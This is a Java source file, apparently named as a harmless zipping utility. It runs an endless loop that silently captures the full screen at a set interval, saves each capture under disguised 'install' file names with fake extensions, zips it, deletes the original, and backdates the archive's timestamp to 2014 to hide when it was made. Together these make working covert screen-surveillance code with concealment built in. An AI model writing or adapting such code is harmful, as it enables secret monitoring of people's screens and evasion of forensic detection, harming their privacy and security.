package org.simpleprojects.sampleProject;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import javax.imageio.ImageIO;

public class ZipJobs {

	public static void main(String[] args) throws Exception {
		Calendar cal = Calendar.getInstance();
		cal.set(2014, 12, 23,22,20,23);
		
		long time = cal.getTimeInMillis();
		while (true) {
			Thread.sleep(60*1000* Long.parseLong(args[1]));
			long lng = 0;
			ArrayList<File> aryLstfOrg = new ArrayList<File>();


			lng = System.currentTimeMillis();
			String strFileInput = args[0] + "install" + lng + ".mbg";
			File fOrg = new File(strFileInput);
			BufferedImage image = new Robot()
					.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
			ImageIO.write(image,"jpg" , fOrg);

			
			aryLstfOrg.add(fOrg);


			File fZip = new File(args[0] + "install" + lng + ".ipz");

			zip(fZip, aryLstfOrg);

			for(File file : aryLstfOrg){
				file.delete();
			}
			
			fZip.setLastModified(time);
			
			System.gc();
		}
	}

	public static void zip(File zip, ArrayList<File> aryfile) throws IOException {
		ZipOutputStream zos = null;
		try {

			zos = new ZipOutputStream(new FileOutputStream(zip));

			FileInputStream fis = null;

			for (File file : aryfile) {
				String name = file.getName();
				fis = new FileInputStream(file);
				ZipEntry entry = new ZipEntry(name);
				zos.putNextEntry(entry);
				byte[] byteBuffer = new byte[1024];
				int bytesRead = -1;
				while ((bytesRead = fis.read(byteBuffer)) != -1) {
					zos.write(byteBuffer, 0, bytesRead);
				}
				zos.flush();
				fis.close();
			}

			zos.closeEntry();

			zos.flush();
		} finally {
			try {
				zos.close();
			} catch (Exception e) {
			}
		}
	}

}
